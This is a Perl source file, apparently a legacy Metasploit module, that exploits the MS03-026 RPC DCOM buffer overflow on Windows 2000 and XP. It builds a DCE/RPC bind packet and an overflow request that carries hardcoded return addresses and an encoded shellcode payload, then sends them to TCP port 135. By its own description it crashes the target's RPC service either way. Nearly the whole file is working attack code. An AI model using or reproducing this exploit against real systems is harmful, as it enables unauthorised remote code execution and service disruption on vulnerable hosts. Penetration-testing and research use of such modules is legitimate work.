package Msf::Exploit::msrpc_dcom_ms03_026_win2kxp;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Microsoft RPC DCOM MSO3-026 NT 2K/XP',
    'Version'  => '2.0',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 135],
                },
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'Payload' => {
                 'Space'  => 668,
                 'BadChars'  => "\x00\x0a\x0d\x5c\x5f",
               },
    
    'Description'  => "This exploits the overflow found by LSD in the DCOM service available over ".
                      "RPC. This module has been tested against all english versions of Windows 2000 ".
                      "and Windows XP. The target must have DCOM enabled and TCP port 135 open. This ".
                      "exploit will crash the RPC service on the remote system regardless of whether ".
                      "it is succesful or not.",
                
    'Refs'  =>  [  
                    'http://www.microsoft.com/technet/security/bulletin/MS03-026.asp'
                ],
    'Targets' => [
    
                   ['Windows 2000', 0x0018759f, 0x7ffde0cc],
                   # ['Windows 2000', 0x77838eef, 0x7ffde0cc],
                   ['Windows XP',   0x75ab4bba, 0x7ffde0cc],
                   ['Debug Test',   0x12345678, 0x11223344],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];

    my ($os, $l_ret, $l_wri) = @{$target};
    my $res;

    my $Ret = pack("l", $l_ret);
    my $Wri = pack("l", $l_wri);
    
    my $s = Msf::Socket->new();
    if (! $s->tcp($target_host, $target_port))
    {
        $self->PrintLine("");
        $self->PrintLine("[*] Could not connect to target:" . $s->Error());
        exit(0);
    }

    my $ISystemActivator = "\xa0\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46";

    my $r_bind = 
        "\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00".
        "\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00".
        $ISystemActivator .
        "\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00".
        "\x2B\x10\x48\x60\x02\x00\x00\x00";

    my $r_dcex =
        "\x05\x00\x00\x03\x10\x00\x00\x00\xE8\x03".
        "\x00\x00\xE5\x00\x00\x00\xD0\x03\x00\x00\x01\x00\x04\x00\x05\x00".
        "\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x32\x24\x58\xFD\xCC\x45".
        "\x64\x49\xB0\x70\xDD\xAE\x74\x2C\x96\xD2\x60\x5E\x0D\x00\x01\x00".
        "\x00\x00\x00\x00\x00\x00\x70\x5E\x0D\x00\x02\x00\x00\x00\x7C\x5E".
        "\x0D\x00\x00\x00\x00\x00\x10\x00\x00\x00\x80\x96\xF1\xF1\x2A\x4D".
        "\xCE\x11\xA6\x6A\x00\x20\xAF\x6E\x72\xF4\x0C\x00\x00\x00\x4D\x41".
        "\x52\x42\x01\x00\x00\x00\x00\x00\x00\x00\x0D\xF0\xAD\xBA\x00\x00".
        "\x00\x00\xA8\xF4\x0B\x00\x60\x03\x00\x00\x60\x03\x00\x00\x4D\x45".
        "\x4F\x57\x04\x00\x00\x00\xA2\x01\x00\x00\x00\x00\x00\x00\xC0\x00".
        "\x00\x00\x00\x00\x00\x46\x38\x03\x00\x00\x00\x00\x00\x00\xC0\x00".
        "\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x03\x00\x00\x28\x03".
        "\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC\xC8\x00".
        "\x00\x00\x4D\x45\x4F\x57\x28\x03\x00\x00\xD8\x00\x00\x00\x00\x00".
        "\x00\x00\x02\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xC4\x28\xCD\x00\x64\x29".
        "\xCD\x00\x00\x00\x00\x00\x07\x00\x00\x00\xB9\x01\x00\x00\x00\x00".
        "\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\xAB\x01\x00\x00\x00\x00".
        "\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\xA5\x01\x00\x00\x00\x00".
        "\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\xA6\x01\x00\x00\x00\x00".
        "\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\xA4\x01\x00\x00\x00\x00".
        "\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\xAD\x01\x00\x00\x00\x00".
        "\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\xAA\x01\x00\x00\x00\x00".
        "\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00".
        "\x00\x00\x58\x00\x00\x00\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00".
        "\x00\x00\x78\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10".
        "\x08\x00\xCC\xCC\xCC\xCC\x50\x00\x00\x00\x4F\xB6\x88\x20\xFF\xFF".
        "\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10".
        "\x08\x00\xCC\xCC\xCC\xCC\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09".
        "\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\x10\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00".
        "\x00\x00\x78\x19\x0C\x00\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00".
        "\x00\x00\x70\xD8\x98\x93\x98\x4F\xD2\x11\xA9\x3D\xBE\x57\xB2\x00".
        "\x00\x00\x32\x00\x31\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x80\x00".
        "\x00\x00\x0D\xF0\xAD\xBA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00".
        "\x00\x00\x60\x00\x00\x00\x4D\x45\x4F\x57\x04\x00\x00\x00\xC0\x01".
        "\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\x3B\x03".
        "\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46\x00\x00".
        "\x00\x00\x30\x00\x00\x00\x01\x00\x01\x00\x81\xC5\x17\x03\x80\x0E".
        "\xE9\x4A\x99\x99\xF1\x8A\x50\x6F\x7A\x85\x02\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x30\x00".
        "\x00\x00\x78\x00\x6E\x00\x00\x00\x00\x00\xD8\xDA\x0D\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x20\x2F\x0C\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00".
        "\x58\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x10\x00".
        "\x00\x00\x30\x00\x2E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x68\x00".
        "\x00\x00\x0E\x00\xFF\xFF\x68\x8B\x0B\x00\x02\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00";

    my $r_size = 
        "\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x5C\x00\x5C\x00";

    my $r_end =
        "\x5C\x00\x43\x00\x24\x00\x5C\x00\x31\x00\x32\x00\x33\x00\x34\x00".
        "\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00".
        "\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00".
        "\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00\x01\x10\x08\x00".
        "\xCC\xCC\xCC\xCC\x20\x00\x00\x00\x30\x00\x2D\x00\x00\x00\x00\x00".
        "\x88\x2A\x0C\x00\x02\x00\x00\x00\x01\x00\x00\x00\x28\x8C\x0C\x00".
        "\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";
            
    my $r_shell =
        "\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00".
        "\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00".
        "\x46\x00\x58\x00" . $Ret . $Wri . $Wri . $shellcode;

    

    my $exploit = $r_dcex;
    my $sc_len = length($r_shell);


    $self->PrintLine(sprintf("[*] Using return address 0x%.8x for $os with scratch pad at 0x%.8x", $l_ret, $l_wri));
 
    substr($r_size, 0, 4, pack("V", unpack("V", substr($r_size, 0, 4)) + ($sc_len / 2)));
    substr($r_size, 8, 4, pack("V", unpack("V", substr($r_size, 8, 4)) + ($sc_len / 2)));

    $exploit .= $r_size;
    $exploit .= $r_shell;
    $exploit .= $r_end;
    
    my $dce_clen = ($sc_len - 0x0c);

    # And you thought the C version was hard to read :)
    substr($exploit, 0x08, 4, pack("V", unpack("V", substr($exploit, 0x08, 4)) + ($sc_len - 0x0c)));
    substr($exploit, 0x10, 4, pack("V", unpack("V", substr($exploit, 0x10, 4)) + ($sc_len - 0x0c)));
    substr($exploit, 0x80, 4, pack("V", unpack("V", substr($exploit, 0x80, 4)) + ($sc_len - 0x0c)));
    substr($exploit, 0x84, 4, pack("V", unpack("V", substr($exploit, 0x84, 4)) + ($sc_len - 0x0c)));
    substr($exploit, 0xb4, 4, pack("V", unpack("V", substr($exploit, 0xb4, 4)) + ($sc_len - 0x0c)));
    substr($exploit, 0xb8, 4, pack("V", unpack("V", substr($exploit, 0xb8, 4)) + ($sc_len - 0x0c)));
    substr($exploit, 0xd0, 4, pack("V", unpack("V", substr($exploit, 0xd0, 4)) + ($sc_len - 0x0c)));
    substr($exploit, 0x18c,4, pack("V", unpack("V", substr($exploit, 0x18c,4)) + ($sc_len - 0x0c)));

    $s->send($r_bind);
    $res = $s->recv(5);
    
    $s->send($exploit);
    $res = $s->recv(5);
    
    $s->close();
    
    if ($res)
    {
        $self->PrintLine("[*] Target is either patched or running Windows NT 4.0");
        return;
    }
    
    sleep(2);
    exit(0);
}


1;
